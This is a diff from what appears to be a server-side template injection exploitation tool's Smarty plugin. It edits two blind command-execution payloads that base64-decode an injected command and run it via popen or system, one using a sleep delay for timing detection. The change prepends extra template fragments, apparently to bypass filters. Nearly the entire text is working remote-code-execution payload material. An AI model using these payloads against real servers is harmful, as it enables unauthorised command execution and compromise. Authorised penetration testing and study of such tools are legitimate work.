@@ -72,11 +72,11 @@ class Smarty(php.Php):
             },
             'execute_boolean': {
                 'call': 'inject',
-                'execute_blind': """{{if 1 / (pclose(popen(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), "wb")) == 0)}}{{/if}}"""
+                'execute_blind': """{{* 1 / 0 *}}{{"a"|cat:"b"}}{{if 1 / (pclose(popen(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), "wb")) == 0)}}{{/if}}"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{if system(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))|cat:" && sleep {delay}")}}{{/if}}"""
+                'execute_blind': """{{* 1 / 0 *}}{{"a"|cat:"b"}}{{if system(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))|cat:" && sleep {delay}")}}{{/if}}"""
             },
         })
 
